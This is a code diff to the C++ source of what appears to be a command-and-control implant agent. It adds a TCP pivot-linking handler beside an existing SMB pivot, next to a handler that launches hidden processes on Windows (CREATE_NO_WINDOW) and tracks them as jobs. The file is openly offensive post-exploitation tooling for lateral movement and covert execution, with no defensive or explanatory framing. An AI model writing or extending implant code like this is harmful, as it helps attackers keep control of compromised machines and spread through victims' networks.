@@ -417,6 +417,14 @@ void Commander::CmdLink(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 		this->agent->pivotter->LinkPivotSMB(taskId, commandId, pipe, outPacker);
 	}
+	else if (pivotType == PIVOT_TYPE_TCP) {
+		ULONG addrSize = 0;
+		CHAR* addr   = (CHAR*)inPacker->UnpackBytes(&addrSize);
+		WORD  port   = inPacker->Unpack32();
+		ULONG taskId = inPacker->Unpack32();
+
+		this->agent->pivotter->LinkPivotTCP(taskId, commandId, addr, port, outPacker);
+	}
 }
 
 void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -747,8 +755,6 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 
 	BOOL result = ApiWin->CreateProcessA(prog, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
-
-
 	if (result) {
 		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);
 
